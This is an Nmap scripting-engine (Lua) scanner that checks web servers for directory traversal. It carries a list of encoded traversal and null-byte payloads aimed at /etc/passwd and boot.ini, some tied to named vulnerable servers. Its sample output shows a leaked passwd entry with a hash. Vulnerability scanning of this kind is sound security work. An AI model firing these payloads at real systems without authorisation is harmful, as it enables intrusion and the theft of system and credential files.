local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"

description = [[
Checks if a web server is vulnerable to directory traversal by attempting to
retrieve <code>/etc/passwd</code> or <code>\boot.ini</code>.

The script uses several technique:
* Generic directory traversal by requesting paths like <code>../../../../etc/passwd</code>.
* Known specific traversals of several web servers.
* Query string traversal. This sends traversals as query string parameters to paths that look like they refer to a local file name. The potential query is searched for in at the path controlled by the script argument <code>http-passwd.root</code>.
]]

---
-- @usage
-- nmap --script http-passwd --script-args http-passwd.root=/test/ <target>
--
-- @args http-passwd.root Query string tests will be done relative to this path.
-- The default value is <code>/</code>. Normally the value should contain a
-- leading slash. The queries will be sent with a trailing encoded null byte to
-- evade certain checks; see http://insecure.org/news/P55-01.txt.
--
-- @output
-- 80/tcp open  http
-- | http-passwd: Directory traversal found.
-- | Payload: "index.html?../../../../../boot.ini"
-- | Printing first 250 bytes:
-- | [boot loader]
-- | timeout=30
-- | default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS
-- | [operating systems]
-- |_multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /noexecute=optin /fastdetect
--
--
-- 80/tcp open  http
-- | http-passwd: Directory traversal found.
-- | Payload: "../../../../../../../../../../etc/passwd"
-- | Printing first 250 bytes:
-- | root:$1$$iems.VX5yVMByaB1lT8fx.:0:0::/:/bin/sh
-- | sshd:*:65532:65534::/:/bin/false
-- | ftp:*:65533:65534::/:/bin/false
-- |_nobody:*:65534:65534::/:/bin/false

-- 07/20/2007:
--   * Used Thomas Buchanan's HTTPAuth script as a starting point
--   * Applied some great suggestions from Brandon Enright, thanks a lot man!
--
-- 01/31/2008:
--   * Rewritten to use Sven Klemm's excellent HTTP library and to do some much
--     needed cleaning up
--
-- 06/2010:
--   * Added Microsoft Windows (XP and previous) support by also looking for
--     \boot.ini
--   * Added specific payloads according to vulnerabilities published against
--     various specific products.
--
-- 08/2010:
--   * Added Poison NULL Byte tests

author = "Kris Katterjohn, Ange Gutek"

license = "Same as Nmap--See https://nmap.org/book/man-legal.html"

categories = {"intrusive", "vuln"}


--- Validates the HTTP response code and checks for a <code>valid</code> passwd
-- or Windows Boot Loader format in the body.
--@param response The HTTP response from the server.
--@return The body of the HTTP response.
local validate = function(response)
  if not response.status then
    return nil
  end

  if response.status ~= 200 then
    return nil
  end

  if response.body:match("^[^:]+:[^:]*:[0-9]+:[0-9]+:") or response.body:match("%[boot loader%]") then
    return response.body
  end

  return nil
end

--- Transforms a string with ".", "/" and "\" converted to their URL-formatted
--- hex equivalents
--@param str String to hexify.
--@return Transformed string.
local hexify = function(str)
  local ret
  ret = str:gsub("%.", "%%2E")
  ret = ret:gsub("/", "%%2F")
  ret = ret:gsub("\\", "%%5C")
  return ret
end

--- Truncates the <code>passwd</code> or <code>boot.ini</code> file.
--@param passwd <code>passwd</code> or <code>boot.ini</code>file.
--@return Truncated passwd file and truncated length.
local truncatePasswd = function(passwd)
  local len = 250
  return passwd:sub(1, len), len
end

--- Formats output.
--@param passwd <code>passwd</code> or <code>boot.ini</code> file.
--@param dir Formatted request which elicited the good response.
--@return String description for output
local output = function(passwd, dir)
  local trunc, len = truncatePasswd(passwd)
  return ('Directory traversal found.\nPayload: "%s"\nPrinting first %d bytes:\n%s'):format(dir, len, trunc)
end

portrule = shortport.http

action = function(host, port)
  local dirs = {
    hexify("//etc/passwd"),
    hexify(string.rep("../", 10) .. "etc/passwd"),
    hexify(string.rep("../", 10) .. "boot.ini"),
    hexify(string.rep("..\\", 10) .. "boot.ini"),
    hexify("." .. string.rep("../", 10) .. "etc/passwd"),
    hexify(string.rep("..\\/", 10) .. "etc\\/passwd"),
    hexify(string.rep("..\\", 10) .. "etc\\passwd"),

    -- These don't get hexified because they are targeted at
    -- specific known vulnerabilities.
    '..\\\\..\\\\..\\..\\\\..\\..\\\\..\\..\\\\\\boot.ini',
    --miniwebsvr
    '%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./boot.ini',
    '%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/boot.ini',
    --Acritum Femitter Server
    '\\\\..%2f..%2f..%2f..%2fboot.ini% ../',
    --zervit Web Server and several others
    'index.html?../../../../../boot.ini',
    'index.html?..\\..\\..\\..\\..\\boot.ini',
    --Mongoose Web Server
    '///..%2f..%2f..%2f..%2fboot.ini',
    '/..%5C..%5C%5C..%5C..%5C%5C..%5C..%5C%5C..%5C..%5Cboot.ini',
    '/%c0%2e%c0%2e\\%c0%2e%c0%2e\\%c0%2e%c0%2e\\boot.ini',
    -- Yaws 1.89
    '/..\\/..\\/..\\/boot.ini',
    '/..\\/\\..\\/\\..\\/\\boot.ini',
    '/\\../\\../\\../boot.ini',
    '////..\\..\\..\\boot.ini',
    --MultiThreaded HTTP Server v1.1
    '/..\\..\\..\\..\\\\..\\..\\\\..\\..\\\\\\boot.ini',
    --uHttp Server
    '/../../../../../../../etc/passwd',
    --Java Mini Web Server
    '/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini',
    '/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%2fpasswd',
  }

  for _, dir in ipairs(dirs) do
    local response = http.get(host, port, dir)

    if validate(response) then
      return output(response.body, dir)
    end
  end

  local root = stdnse.get_script_args("http-passwd.root") or "/"

  -- Check for something that looks like a query referring to a file name, like
  -- "index.php?page=next.php". Replace the query value with each of the test
  -- vectors.
  local response = http.get(host, port, root)
  if response.body then
    local page_var = response.body:match ("[%?%&](%a-)=%a-%.%a")
    if page_var then
      local query_base = root .. "?" .. page_var .. "="
      stdnse.debug1("testing with query %s.", query_base .. "...")

      for _, dir in ipairs(dirs) do
        -- Add an encoded null byte at the end to bypass some checks; see
        -- http://insecure.org/news/P55-01.txt.
        local response = http.get(host, port, query_base .. dir .. "%00")

        if validate(response) then
          return output(response.body, dir .. "%00")
        end

        -- Try again. This time without null byte injection. For example as
        -- of PHP 5.3.4, include() does not accept paths with NULL in them.
        local response = http.get(host, port, query_base .. dir)
        if validate(response) then
            return output(response.body, dir)
        end
      end
    end
  end
end
